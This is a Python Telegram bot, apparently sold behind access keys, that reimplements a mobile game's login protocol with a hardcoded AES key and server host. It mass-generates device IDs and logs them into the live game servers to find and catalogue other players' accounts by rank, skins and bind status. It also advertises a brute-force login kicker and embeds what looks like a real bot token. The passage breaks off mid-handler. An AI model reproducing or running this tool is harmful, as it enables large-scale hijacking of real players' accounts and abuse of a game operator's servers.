#!/usr/bin/env python3
# ===================================================================
# PREMIUM DEVID SEKER - TELEGRAM BOT v5.2
# Added Stop Button for Brute Force
# Created by: @ZyronDevv
# ===================================================================

import os
import sys
import time
import random
import uuid
import json
import threading
import socket
import zlib
import zstandard as zstd
import struct
import re
import requests
import asyncio
import logging
from queue import Queue
from enum import Enum
from typing import Tuple, Dict, Any, List, Optional
from Crypto.Cipher import AES
from datetime import datetime, timezone, timedelta
from dataclasses import dataclass, asdict
from functools import wraps

# Telegram Bot Libraries
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ConversationHandler,
    ContextTypes,
)
from telegram.error import TimedOut, NetworkError, RetryAfter

# ────────────────────────────────────────────────────────────────
# LOGGING CONFIGURATION
# ────────────────────────────────────────────────────────────────

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ────────────────────────────────────────────────────────────────
# BOT CONFIGURATION
# ────────────────────────────────────────────────────────────────

BOT_TOKEN = "8692114721:AAFWynpnoKIza6ym4lv3EBomf4WJTmXJCpo"  # Replace with your bot token
ADMIN_IDS = [8477982865]  # Your Telegram user ID

# Key System Configuration
KEY_FILE = "bot_keys.json"
DEFAULT_KEY_EXPIRY = 7  # Days
MAX_KEYS_PER_ADMIN = 50

# Bot State Constants
(MAIN_MENU, GENERATOR_MENU, CHECK_MENU, BRUTE_MENU, 
 SETTINGS_MENU, KEY_MENU, AWAITING_DEVICE, AWAITING_FILE,
 AWAITING_KEY, AWAITING_BRUTE_CONFIG) = range(10)

# ────────────────────────────────────────────────────────────────
# KEY MANAGEMENT SYSTEM
# ────────────────────────────────────────────────────────────────

@dataclass
class BotKey:
    key: str
    created_by: int
    created_at: str
    expires_at: str
    max_uses: int
    used_count: int
    is_active: bool = True
    notes: str = ""
    
    def is_expired(self) -> bool:
        if not self.expires_at:
            return False
        expiry = datetime.fromisoformat(self.expires_at)
        return datetime.now() > expiry
    
    def can_use(self) -> bool:
        return self.is_active and not self.is_expired() and self.used_count < self.max_uses
    
    def use(self) -> bool:
        if not self.can_use():
            return False
        self.used_count += 1
        if self.used_count >= self.max_uses:
            self.is_active = False
        return True

class KeyManager:
    def __init__(self, key_file: str = KEY_FILE):
        self.key_file = key_file
        self.keys: Dict[str, BotKey] = {}
        self._load_keys()
    
    def _load_keys(self):
        if os.path.exists(self.key_file):
            try:
                with open(self.key_file, 'r') as f:
                    data = json.load(f)
                    for key_str, key_data in data.items():
                        self.keys[key_str] = BotKey(**key_data)
            except Exception as e:
                logger.error(f"Failed to load keys: {e}")
                self.keys = {}
    
    def _save_keys(self):
        try:
            data = {k: asdict(v) for k, v in self.keys.items()}
            with open(self.key_file, 'w') as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            logger.error(f"Failed to save keys: {e}")
    
    def generate_key(self, created_by: int, max_uses: int = 10, 
                     expiry_days: int = DEFAULT_KEY_EXPIRY, 
                     notes: str = "") -> Optional[str]:
        if created_by not in ADMIN_IDS and created_by != 0:
            return None
        
        admin_keys = [k for k in self.keys.values() if k.created_by == created_by and k.is_active]
        if len(admin_keys) >= MAX_KEYS_PER_ADMIN and created_by != 0:
            return None
        
        key_str = f"DEVID_{uuid.uuid4().hex[:16].upper()}"
        expiry = datetime.now() + timedelta(days=expiry_days)
        
        new_key = BotKey(
            key=key_str,
            created_by=created_by,
            created_at=datetime.now().isoformat(),
            expires_at=expiry.isoformat(),
            max_uses=max_uses,
            used_count=0,
            is_active=True,
            notes=notes
        )
        
        self.keys[key_str] = new_key
        self._save_keys()
        return key_str
    
    def validate_key(self, key_str: str) -> Optional[BotKey]:
        key = self.keys.get(key_str)
        if not key:
            return None
        if not key.can_use():
            return None
        return key
    
    def use_key(self, key_str: str, user_id: int) -> bool:
        key = self.keys.get(key_str)
        if not key:
            return False
        if not key.use():
            return False
        self._save_keys()
        return True
    
    def revoke_key(self, key_str: str, admin_id: int) -> bool:
        if admin_id not in ADMIN_IDS:
            return False
        key = self.keys.get(key_str)
        if not key:
            return False
        key.is_active = False
        self._save_keys()
        return True
    
    def list_keys(self, admin_id: int) -> List[BotKey]:
        if admin_id not in ADMIN_IDS:
            return []
        return [k for k in self.keys.values()]
    
    def get_stats(self) -> Dict:
        total = len(self.keys)
        active = len([k for k in self.keys.values() if k.is_active and not k.is_expired()])
        expired = len([k for k in self.keys.values() if k.is_expired()])
        used = len([k for k in self.keys.values() if k.used_count > 0])
        total_uses = sum(k.used_count for k in self.keys.values())
        return {
            'total': total,
            'active': active,
            'expired': expired,
            'used': used,
            'total_uses': total_uses
        }

key_manager = KeyManager()

# ────────────────────────────────────────────────────────────────
# USER SESSION MANAGEMENT
# ────────────────────────────────────────────────────────────────

class UserSession:
    def __init__(self, user_id: int):
        self.user_id = user_id
        self.authorized = False
        self.auth_expiry = None
        self.current_operation = None
        self.data = {}
        self.last_activity = datetime.now()
    
    def is_authorized(self) -> bool:
        if not self.authorized:
            return False
        if self.auth_expiry and datetime.now() > self.auth_expiry:
            self.authorized = False
            return False
        return True
    
    def authorize(self, key: BotKey):
        self.authorized = True
        self.auth_expiry = datetime.now() + timedelta(hours=24)
        self.key_used = key.key

class SessionManager:
    def __init__(self):
        self.sessions: Dict[int, UserSession] = {}
        self._cleanup_lock = threading.Lock()
        self._start_cleanup()
    
    def get_session(self, user_id: int) -> UserSession:
        if user_id not in self.sessions:
            self.sessions[user_id] = UserSession(user_id)
        self.sessions[user_id].last_activity = datetime.now()
        return self.sessions[user_id]
    
    def is_authorized(self, user_id: int) -> bool:
        if user_id in ADMIN_IDS:
            return True
        session = self.get_session(user_id)
        return session.is_authorized()
    
    def authorize(self, user_id: int, key: BotKey) -> bool:
        session = self.get_session(user_id)
        session.authorize(key)
        return True
    
    def revoke(self, user_id: int):
        if user_id in self.sessions:
            self.sessions[user_id].authorized = False
    
    def _start_cleanup(self):
        def cleanup():
            while True:
                time.sleep(3600)
                with self._cleanup_lock:
                    now = datetime.now()
                    to_remove = []
                    for uid, session in self.sessions.items():
                        if (now - session.last_activity).seconds > 86400:
                            to_remove.append(uid)
                    for uid in to_remove:
                        del self.sessions[uid]
        threading.Thread(target=cleanup, daemon=True).start()

session_manager = SessionManager()

# ────────────────────────────────────────────────────────────────
# ORIGINAL SCRIPT FUNCTIONS (ADAPTED)
# ────────────────────────────────────────────────────────────────

TZ_WIB = timezone(timedelta(hours=7))
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR = os.path.join(BASE_DIR, "BOT_OUTPUT")

AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
AES_IV = b'\x00' * 16
SERVER_HOST = 'login.ml.youngjoygame.com'
SERVER_PORT = 30021
CLIENT_VERSION = '2.1.99.1205.1'
CHANNEL = 'and_usa'
LANGUAGE = 'en'

HEX_CHARS = "0123456789abcdef"
BASE64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"

FOLDERS = {
    "generated": "00_Generated",
    "login": "01_Login_Success",
    "detail": "03_Hasil_Detail_8Req",
    "rank_warrior": "04_Rank_Warrior",
    "rank_elite": "05_Rank_Elite",
    "rank_master": "06_Rank_Master",
    "rank_gm": "07_Rank_Grandmaster",
    "rank_epic": "08_Rank_Epic",
    "rank_legend": "09_Rank_Legend",
    "rank_mythic": "10_Rank_Mythic",
    "v2l_active": "11_V2L_Active",
    "v2l_inactive": "12_V2L_Inactive",
    "sultan": "13_Sultan",
    "highrank": "14_HighRank",
    "akun_tua": "15_Akun_Tua",
    "error": "99_Error",
    "bruteforce": "00_BruteForce_Logs",
}

def ensure_dirs():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    for folder in FOLDERS.values():
        os.makedirs(os.path.join(OUTPUT_DIR, folder), exist_ok=True)
ensure_dirs()

# ─── SDP Protocol Classes ──────────────────────────────────────

class SdpDataType(Enum):
    INTEGER_POSITIVE = 0
    INTEGER_NEGATIVE = 1
    FLOAT = 2
    DOUBLE = 3
    STRING = 4
    LIST = 5
    DICT = 6
    STRUCT_BEGIN = 7
    STRUCT_END = 8

class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data = b''
        self.offset = 0
        if isinstance(data, bytes):
            self.data = data
            self._unpack()
        elif data is not None:
            self.update(data)
            self._pack()

    def _pack(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN.value << 4])
        for k, v in sorted(self.items()):
            self._pack_item(k, v)
        self.data += bytes([SdpDataType.STRUCT_END.value << 4])

    def _unpack(self):
        if not self.data: return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN.value:
            self.offset = 1
        while self.offset < len(self.data):
            k, v = self._unpack_item()
            if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END:
                break
            self[k] = v

    def _write_varint(self, n: int) -> bytes:
        res = bytearray()
        while n >= 0x80:
            res.append((n & 0x7F) | 0x80)
            n >>= 7
        res.append(n & 0x7F)
        return bytes(res)

    def _read_varint(self) -> int:
        n = 1
        val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n)
            n += 1
        self.offset += n
        return val

    def _pack_header(self, tag: int, dtype: SdpDataType):
        if tag < 15:
            self.data += bytes([(dtype.value << 4) | tag])
        else:
            self.data += bytes([(dtype.value << 4) | 15]) + self._write_varint(tag)

    def _pack_item(self, tag: int, val: Any):
        if isinstance(val, bool):
            self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
            self.data += self._write_varint(1 if val else 0)
        elif isinstance(val, int):
            if val < 0:
                self._pack_header(tag, SdpDataType.INTEGER_NEGATIVE)
                self.data += self._write_varint(-val)
            else:
                self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
                self.data += self._write_varint(val)
        elif isinstance(val, float):
            self._pack_header(tag, SdpDataType.DOUBLE)
            self.data += self._write_varint(8) + struct.pack("<d", val)
        elif isinstance(val, (str, bytes)):
            self._pack_header(tag, SdpDataType.STRING)
            enc = val.encode('utf-8') if isinstance(val, str) else val
            self.data += self._write_varint(len(enc)) + enc
        elif isinstance(val, list):
            self._pack_header(tag, SdpDataType.LIST)
            self.data += self._write_varint(len(val))
            for item in val: self._pack_item(0, item)
        elif isinstance(val, dict):
            self._pack_header(tag, SdpDataType.STRUCT_BEGIN)
            for k, v in sorted(val.items()): self._pack_item(k, v)
            self.data += bytes([SdpDataType.STRUCT_END.value << 4])
        else:
            raise Exception("Unsupported type")

    def _unpack_item(self) -> Tuple[int, Any]:
        if self.offset >= len(self.data): return 0, None
        hdr = self.data[self.offset]
        tag = hdr & 0xF
        dtype = SdpDataType(hdr >> 4)
        self.offset += 1
        if tag == 15: tag = self._read_varint()
        if dtype == SdpDataType.INTEGER_POSITIVE: return tag, self._read_varint()
        if dtype == SdpDataType.INTEGER_NEGATIVE: return tag, -self._read_varint()
        if dtype == SdpDataType.FLOAT: return tag, struct.unpack("<f", self._read_varint().to_bytes(4, 'little'))[0]
        if dtype == SdpDataType.DOUBLE: return tag, struct.unpack("<d", self._read_varint().to_bytes(8, 'little'))[0]
        if dtype == SdpDataType.STRING:
            l = self._read_varint()
            raw = self.data[self.offset:self.offset + l]
            self.offset += l
            try: return tag, raw.decode('utf-8')
            except: return tag, raw
        if dtype == SdpDataType.LIST:
            l = self._read_varint()
            res = [self._unpack_item()[1] for _ in range(l)]
            return tag, res
        if dtype == SdpDataType.DICT:
            l = self._read_varint()
            res = {}
            for _ in range(l):
                _, k = self._unpack_item()
                _, v = self._unpack_item()
                res[k] = v
            return tag, res
        if dtype == SdpDataType.STRUCT_BEGIN:
            res = {}
            while True:
                k, v = self._unpack_item()
                if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END: break
                res[k] = v
            return tag, SdpStruct(res)
        if dtype == SdpDataType.STRUCT_END: return tag, SdpDataType.STRUCT_END
        raise Exception("Unknown data type")

# ─── Game Connection Classes ──────────────────────────────────

class BaseConnection:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.sequence = 1
        self.socket = None
        self.queue = b''

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
        self.socket.settimeout(5)

    def cleanup(self):
        if self.socket:
            try: self.socket.close()
            except: pass
            self.sequence = 1
            self.socket = None

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, *args):
        self.cleanup()

    def send_data(self, pid: int, sdp: SdpStruct):
        pkt = SdpStruct({0: pid, 1: self.sequence, 5: sdp.data}).data
        comp = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        self.socket.send(flags.to_bytes(4, 'big') + comp)
        self.sequence += 1

    def recv_data(self) -> Tuple[Optional[int], Optional[SdpStruct]]:
        try:
            while len(self.queue) < 4:
                d = self.socket.recv(4096)
                if not d: return None, None
                self.queue += d
            flags = int.from_bytes(self.queue[:4], 'big')
            size = flags & 0xFFFFFF
            ctype = flags >> 24
            while len(self.queue) < size:
                d = self.socket.recv(4096)
                if not d: return None, None
                self.queue += d
            data = self.queue[4:size]
            self.queue = self.queue[size:]
            if ctype == 1: data = zlib.decompress(data)
            elif ctype == 16: data = zstd.decompress(data)
            elif ctype in (2, 3, 18):
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data = cipher.decrypt(data[:-1] if len(data) % 16 else data).rstrip(b'\x00')
                if ctype == 3: data = zlib.decompress(data)
                elif ctype == 18: data = zstd.decompress(data)
            res = SdpStruct(data)
            pid = res.get(0)
            if pid is None: return None, None
            body = res.get(6) or res.get(5)
            return (pid, SdpStruct(body)) if body and isinstance(body, bytes) else (pid, None)
        except socket.timeout: return -1, None
        except: return None, None

class GameLogin(BaseConnection):
    def __init__(self, device_id: str):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.device_id = device_id
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")):
            raw = raw[4:]
        self.imei = raw[:32] if len(raw) >= 32 else raw
        self.android = raw[32:48] if len(raw) >= 48 else ""
        self.adid = raw[48:] if len(raw) > 48 else ""

    def run(self) -> Tuple[Optional[int], Optional[int], str]:
        try:
            self.connect()
            self.send_data(1, SdpStruct({
                0: self.device_id,
                1: f'gps_adid={self.adid}&android_id={self.android}&device_unique_id={self.imei}',
                2: CLIENT_VERSION, 3: CHANNEL, 4: LANGUAGE
            }))
            pid, res = self.recv_data()
            if pid == 2 and res:
                return res.get(0), (res[2][0] if 2 in res else None), "NORMAL"
            return None, None, f"FAIL (PID: {pid})"
        except Exception as e:
            return None, None, f"ERROR ({e})"
        finally:
            self.cleanup()

class GameConnection(BaseConnection):
    def __init__(self, device_id: str):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.device_id = device_id
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")):
            raw = raw[4:]
        self.imei = raw[:32] if len(raw) >= 32 else raw
        self.android = raw[32:48] if len(raw) >= 48 else ""
        self.adid = raw[48:] if len(raw) > 48 else ""
        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.game_host = ''
        self.game_port = 0
        self.creation_ts = 0
        self.ban_status = "NORMAL"

    def login_to_login_server(self) -> bool:
        if not self.socket or self.host != SERVER_HOST:
            self.cleanup()
            self.host, self.port = SERVER_HOST, SERVER_PORT
            self.connect()
        self.send_data(1, SdpStruct({
            0: self.device_id,
            1: f'gps_adid={self.adid}&android_id={self.android}&device_unique_id={self.imei}',
            2: CLIENT_VERSION, 3: CHANNEL, 4: 'en'
        }))
        pid, res = self.recv_data()
        if pid == 2 and res:
            self.account_id = res.get(0)
            self.session_key = res[1]
            self.zone_id = res[2][0]
            self.creation_ts = res.get(19, 0)
            self.ban_status = "NORMAL"
            return True
        if res and isinstance(res, dict):
            for v in res.values():
                if isinstance(v, str) and any(b in v.lower() for b in ('ban', 'suspend', 'freeze', 'limit')):
                    self.ban_status = f"BANNED: {v}"
                    return False
        self.ban_status = f"LOGIN FAILED (PID: {pid})"
        return False

    def get_game_server(self) -> bool:
        self.send_data(5, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: CLIENT_VERSION, 5: self.zone_id, 6: CHANNEL
        }))
        pid, res = self.recv_data()
        if pid == 6 and res:
            host, port = res[1].split(':')
            self.game_host = host
            self.game_port = int(port)
            return True
        return False

    def connect_to_game_server(self) -> bool:
        self.cleanup()
        self.host, self.port = self.game_host, self.game_port
        self.connect()
        self.send_data(10001, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: self.zone_id, 4: CLIENT_VERSION, 13: CHANNEL, 15: self.device_id
        }))
        for _ in range(5):
            pid, res = self.recv_data()
            if pid == 10002: return True
            if pid in (-1, None): break
        return False

    def check_ban_status(self) -> str:
        self.send_data(10101, SdpStruct({0: 0, 2: 2}))
        for _ in range(3):
            pid, res = self.recv_data()
            if pid == 20001 and res and isinstance(res, dict) and 0 in res and isinstance(res[0], dict):
                binfo = res[0]
                reason = binfo.get('ban_reason', 'Unknown')
                d, h, m, s = binfo.get('endtime_day', '0'), binfo.get('endtime_hour', '0'), binfo.get('endtime_min', '0'), binfo.get('endtime_sec', '0')
                self.ban_status = f"BANNED (Reason: {reason} | Remaining: {d}d {h}h {m}m {s}s)"
                return self.ban_status
            if pid in (-1, None, 20002): break
        return self.ban_status

    def lookup_player(self, search_value: int):
        self.send_data(11153, SdpStruct({1: int(search_value)}))
        cnt = 0
        for _ in range(8):
            pid, res = self.recv_data()
            if pid in (-1, None): return None
            if pid == 11154: return res
            if pid == 20001:
                cnt += 1
                if cnt >= 2: return None
        return None

    def get_role_info(self, role_id: int, zone_id: int):
        self.send_data(10128, SdpStruct({1: int(role_id), 2: int(zone_id)}))
        for _ in range(4):
            pid, res = self.recv_data()
            if pid in (-1, None): break
            if pid == 10129: return res
        return None

    def get_skin_role_info(self, role_id: int, zone_id: int):
        self.send_data(10143, SdpStruct({0: int(role_id), 1: int(zone_id)}))
        for _ in range(4):
            pid, res = self.recv_data()
            if pid in (-1, None): break
            if pid == 10144: return res
        return None

def get_v2l_status(conn, role_id: int, zone_id: int) -> str:
    try:
        conn.send_data(10208, SdpStruct({0: int(role_id), 1: int(zone_id)}))
        for _ in range(3):
            pid, res = conn.recv_data()
            if pid in (-1, None): break
            if pid == 10208 and res:
                data = dict(res)
                for tag in [10, 11, 13, 14, 15, 0, 2, 3, 5, 20, 21]:
                    val = data.get(tag)
                    if val is not None:
                        if isinstance(val, (int, float)):
                            return "Enabled" if int(val) > 0 else "Disabled"
                        if isinstance(val, str):
                            if val.lower() in ("1", "true", "enabled", "yes"):
                                return "Enabled"
                            if val.lower() in ("0", "false", "disabled", "no"):
                                return "Disabled"
    except Exception:
        pass
    return "N/A"

def map_rank(p) -> str:
    if not p or not isinstance(p, (int, float)) or p <= 0:
        return "Unranked"
    p = int(p)
    
    if p >= 136:
        stars = p - 136
        if stars >= 100: return f"Mythical Immortal ({stars}★)"
        if stars >= 50: return f"Mythical Glory ({stars}★)"
        if stars >= 25: return f"Mythical Honor ({stars}★)"
        return f"Mythic ({stars}★)"
    
    ranks = [
        (105, "Legend", 5, ["V","IV","III","II","I"]),
        (75, "Epic", 5, ["V","IV","III","II","I"]),
        (45, "Grandmaster", 5, ["V","IV","III","II","I"]),
        (25, "Master", 4, ["IV","III","II","I"]),
        (10, "Elite", 3, ["IV","III","II","I"]),
        (1, "Warrior", 3, ["III","II","I"]),
    ]
    for threshold, name, div_stars, div_names in ranks:
        if p >= threshold:
            offset = p - threshold
            div_idx = min(len(div_names)-1, offset // div_stars)
            star = (offset % div_stars) + 1
            return f"{name} {div_names[div_idx]} ({star}★)"
    return "Warrior III (1★)"

def process_device_check(device_id: str) -> Dict[str, Any]:
    """Check a single device and return results"""
    result = {
        'device_id': device_id,
        'success': False,
        'account_id': None,
        'zone_id': None,
        'nickname': None,
        'level': None,
        'rank': None,
        'highest_rank': None,
        'skin_count': 0,
        'hero_count': 0,
        'v2l_status': 'N/A',
        'ban_status': 'NORMAL',
        'created_at': None,
        'error': None
    }
    
    try:
        acc, zone, stat = GameLogin(device_id).run()
        if not acc or not zone:
            result['error'] = f"Login failed: {stat}"
            if 'ban' in stat.lower():
                result['ban_status'] = stat
            return result
        
        result['account_id'] = acc
        result['zone_id'] = zone
        
        with GameConnection(device_id=device_id) as conn:
            if not conn.login_to_login_server():
                result['error'] = "Failed to connect to login server"
                return result
            
            if not conn.get_game_server():
                result['error'] = "Failed to get game server"
                return result
            
            if not conn.connect_to_game_server():
                result['error'] = "Failed to connect to game server"
                return result
            
            skin_info = conn.get_skin_role_info(acc, zone)
            ban_stat = conn.check_ban_status()
            result['ban_status'] = ban_stat
            
            if 'ban' in ban_stat.lower():
                result['error'] = "Account is banned"
                return result
            
            v2l = get_v2l_status(conn, acc, zone)
            result['v2l_status'] = v2l
            
            player_info = conn.lookup_player(acc)
            role_info = conn.get_role_info(acc, zone)
            
            pd = {}
            if player_info and isinstance(player_info, dict):
                if isinstance(player_info.get(0), list) and len(player_info[0]) > 0 and isinstance(player_info[0][0], dict):
                    pd = player_info[0][0]
                elif isinstance(player_info.get(0), dict):
                    pd = player_info[0]
                else:
                    pd = player_info
            
            skin_info = skin_info if isinstance(skin_info, dict) else {}
            role_info = role_info if isinstance(role_info, dict) else {}
            
            result['nickname'] = pd.get(2) or skin_info.get(2) or role_info.get(2) or f"Player_{acc}"
            result['level'] = pd.get(3) or skin_info.get(3) or role_info.get(3) or 1
            result['skin_count'] = skin_info.get(10) if skin_info and skin_info.get(10) is not None else pd.get(83, 0)
            result['hero_count'] = skin_info.get(9) if skin_info and skin_info.get(9) is not None else \
                                   role_info.get(9) if role_info and role_info.get(9) is not None else 0
            
            cur_rank_val = pd.get(8) or skin_info.get(6, 0) or role_info.get(8, 0) or 0
            max_rank_val = pd.get(95) or skin_info.get(15, 0) or role_info.get(9, 0) or 0
            
            result['rank'] = map_rank(cur_rank_val)
            result['highest_rank'] = map_rank(max_rank_val) if max_rank_val else result['rank']
            
            created_raw = pd.get(42) or conn.creation_ts
            if created_raw and isinstance(created_raw, (int, float)) and created_raw > 0:
                try:
                    dt = datetime.fromtimestamp(created_raw, tz=timezone.utc).astimezone(TZ_WIB)
                    result['created_at'] = dt.strftime("%Y-%m-%d %H:%M:%S WIB")
                except:
                    pass
            
            result['success'] = True
            
    except Exception as e:
        result['error'] = str(e)
    
    return result

# ────────────────────────────────────────────────────────────────
# TELEGRAM BOT HANDLERS
# ────────────────────────────────────────────────────────────────

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

def is_authorized(user_id: int) -> bool:
    if is_admin(user_id):
        return True
    return session_manager.is_authorized(user_id)

# ─── Helper Functions ──────────────────────────────────────────

async def safe_reply(update: Update, text: str, **kwargs):
    """Safely reply to a message or callback query"""
    try:
        if update.callback_query:
            try:
                await update.callback_query.edit_message_text(text, **kwargs)
            except:
                await update.callback_query.message.reply_text(text, **kwargs)
        elif update.message:
            await update.message.reply_text(text, **kwargs)
        else:
            logger.warning("No message or callback query to reply to")
    except TimedOut:
        logger.warning("Timeout while sending message, retrying...")
        time.sleep(1)
        try:
            if update.callback_query:
                await update.callback_query.message.reply_text(text, **kwargs)
            elif update.message:
                await update.message.reply_text(text, **kwargs)
        except Exception as e:
            logger.error(f"Failed to send message after retry: {e}")
    except Exception as e:
        logger.error(f"Failed to send message: {e}")

# ─── Start & Help Commands ─────────────────────────────────────

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    try:
        user = update.effective_user
        user_id = user.id
        
        if is_authorized(user_id):
            await show_main_menu(update, context)
        else:
            welcome_msg = (
                f"👋 *Welcome to Premium Devid Seker Bot!*\n\n"
                f"🔐 This bot requires an access key to use.\n"
                f"📝 Please use /redeem <KEY> to activate your access.\n\n"
                f"💡 Commands:\n"
                f"   /start - Show this message\n"
                f"   /redeem <KEY> - Activate your key\n"
                f"   /help - Show help information\n"
                f"   /status - Check your access status\n\n"
                f"👑 *Created by:* @ZyronDevv"
            )
            await safe_reply(update, welcome_msg, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Error in start_command: {e}")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /help command"""
    help_text = (
        "📚 *Premium Devid Seker Bot Help*\n\n"
        "*Available Commands:*\n"
        "  /start - Main menu\n"
        "  /redeem <KEY> - Activate access key\n"
        "  /status - Check access status\n"
        "  /help - Show this help\n\n"
        "*Features:*\n"
        "✅ Full device check (8-request)\n"
        "✅ Rank detection & sorting\n"
        "✅ V2L status detection\n"
        "✅ Sultan accounts detection\n"
        "✅ Bulk checking with file upload\n"
        "✅ Device ID generation\n"
        "✅ Brute force login kicker with STOP button\n\n"
        "👑 *Created by:* @ZyronDevv"
    )
    await safe_reply(update, help_text, parse_mode='Markdown')

# ─── Main Menu ──────────────────────────────────────────────────

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show the main menu with buttons"""
    keyboard = [
        [InlineKeyboardButton("🔍 Single Check", callback_data="menu_single")],
        [InlineKeyboardButton("📊 Bulk Check", callback_data="menu_bulk")],
        [InlineKeyboardButton("🔨 Generate IDs", callback_data="menu_generate")],
        [InlineKeyboardButton("⚡ Brute Force", callback_data="menu_bruteforce")],
        [InlineKeyboardButton("📈 Statistics", callback_data="menu_stats")],
        [InlineKeyboardButton("🔑 Key Management", callback_data="menu_keys")],
        [InlineKeyboardButton("❓ Help", callback_data="menu_help")],
    ]
    
    try:
        if update.callback_query:
            await update.callback_query.edit_message_text(
                "🏠 *Main Menu*\n\nSelect an option below:",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )
        elif update.message:
            await update.message.reply_text(
                "🏠 *Main Menu*\n\nSelect an option below:",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )
    except Exception as e:
        logger.error(f"Error showing main menu: {e}")

# ─── Menu Callback Handler ─────────────────────────────────────

async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle menu button callbacks"""
    try:
        query = update.callback_query
        await query.answer()
        
        user_id = update.effective_user.id
        if not is_authorized(user_id):
            await query.edit_message_text(
                "🔒 *Access Denied*\n\nPlease use /redeem <KEY> to activate your access.",
                parse_mode='Markdown'
            )
            return
        
        data = query.data
        
        if data == "menu_main":
            await show_main_menu(update, context)
        
        elif data == "menu_single":
            await query.edit_message_text(
                "🔍 *Single Device Check*\n\nPlease send me the Device ID to check.\n"
                "Example: `and_abcd1234...`\n\nOr type /cancel to go back.",
                parse_mode='Markdown'
            )
            context.user_data['state'] = AWAITING_DEVICE
        
        elif data == "menu_bulk":
            keyboard = [
                [InlineKeyboardButton("📤 Upload File", callback_data="bulk_upload")],
                [InlineKeyboardButton("📋 Use Generated", callback_data="bulk_generated")],
                [InlineKeyboardButton("🔙 Back", callback_data="menu_main")],
            ]
            await query.edit_message_text(
                "📊 *Bulk Check*\n\nChoose input source:",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )
        
        elif data == "menu_generate":
            keyboard = [
                [InlineKeyboardButton("10 MB", callback_data="gen_10")],
                [InlineKeyboardButton("50 MB", callback_data="gen_50")],
                [InlineKeyboardButton("100 MB", callback_data="gen_100")],
                [InlineKeyboardButton("500 MB", callback_data="gen_500")],
                [InlineKeyboardButton("Custom", callback_data="gen_custom")],
                [InlineKeyboardButton("🔙 Back", callback_data="menu_main")],
            ]
            await query.edit_message_text(
                "🔨 *Generate Device IDs*\n\nSelect size to generate:",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )
        
        elif data.startswith("gen_"):
            sizes = {"10": 10, "50": 50, "100": 100, "500": 500}
            size_str = data.replace("gen_", "")
            if size_str == "custom":
                await query.edit_message_text(
                    "📝 *Custom Size*\n\nEnter size in MB:",
                    parse_mode='Markdown'
                )
                context.user_data['state'] = GENERATOR_MENU
                return
            
            size = sizes.get(size_str, 10)
            await query.edit_message_text(
                f"⏳ *Generating {size}MB of Device IDs...*\nThis may take a few moments.",
                parse_mode='Markdown'
            )
            
            try:
                output_file = os.path.join(OUTPUT_DIR, FOLDERS["generated"], "generated_devices.txt")
                if os.path.exists(output_file):
                    os.remove(output_file)
                
                count = int((size * 1024 * 1024) / 80 * 1.02)
                generate_devices(count, output_file)
                
                if os.path.exists(output_file):
                    with open(output_file, 'r') as f:
                        line_count = sum(1 for _ in f)
                    
                    keyboard = [
                        [InlineKeyboardButton("📥 Download", callback_data="download_generated")],
                        [InlineKeyboardButton("✅ Use for Bulk Check", callback_data="bulk_generated")],
                        [InlineKeyboardButton("🔙 Back", callback_data="menu_main")],
                    ]
                    await query.edit_message_text(
                        f"✅ *Generation Complete!*\n\n📊 Generated: {line_count:,} devices\n"
                        f"📦 File size: ~{size}MB\n\nWhat would you like to do?",
                        reply_markup=InlineKeyboardMarkup(keyboard),
                        parse_mode='Markdown'
                    )
                else:
                    await query.edit_message_text("❌ *Generation Failed*\n\nPlease try again later.", parse_mode='Markdown')
            except Exception as e:
                await query.edit_message_text(f"❌ *Error:* {str(e)}", parse_mode='Markdown')
        
        elif data == "download_generated":
            file_path = os.path.join(OUTPUT_DIR, FOLDERS["generated"], "generated_devices.txt")
            if os.path.exists(file_path):
                with open(file_path, 'rb') as f:
                    await query.message.reply_document(
                        document=InputFile(f, filename="generated_devices.txt"),
                        caption="📥 Generated Device IDs"
                    )
                await query.answer("File sent!")
            else:
                await query.answer("File not found!", show_alert=True)
        
        elif data == "bulk_upload":
